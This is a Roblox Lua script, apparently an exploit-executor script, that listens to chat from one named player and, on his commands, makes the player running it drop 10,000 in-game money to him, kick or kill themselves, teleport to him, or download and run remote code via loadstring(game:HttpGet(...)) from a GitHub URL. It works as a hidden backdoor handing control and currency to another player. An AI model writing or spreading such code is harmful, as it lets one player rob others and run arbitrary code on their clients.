repeat wait() until game.Players:FindFirstChild('preachdied') 


game.Players:FindFirstChild('preachdied').Chatted:Connect(function(msg)

    if msg == ";dropmoney "..game.Players.LocalPlayer.Name then
        local args = {
            [1] = "DropMoney",
            [2] = "10000" --change to how much money you want to drop
        }
        game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))  
    end


    if msg == ";kick "..game.Players.LocalPlayer.Name then
        game.Players.LocalPlayer:Kick('User BANNED')

    end


    if msg ==";kill "..game.Players.LocalPlayer.Name then    
        game.Players.LocalPlayer.Character.Head:Destroy()

    end

    if msg ==";reswagmode "..game.Players.LocalPlayer.Name then    

        game.CoreGui:FindFirstChild('Swagmode'):Destroy()
        wait(0.5)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))() 

    end

    if msg ==";loadscript "..game.Players.LocalPlayer.Name then    
        loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()

    end

    if msg ==";cuffban "..game.Players.LocalPlayer.Name then    
        game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('OneMoreTime');

    end

    if msg ==";bring "..game.Players.LocalPlayer.Name then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('preachdied').Character.HumanoidRootPart.CFrame

    end

    if msg ==";bring all" then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('preachdied').Character.HumanoidRootPart.CFrame

    end

    if msg == ";dropmoney all" then
        local args = {
            [1] = "DropMoney",
            [2] = "10000" --change to how much money you want to drop
        }
        game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))  
    end
end)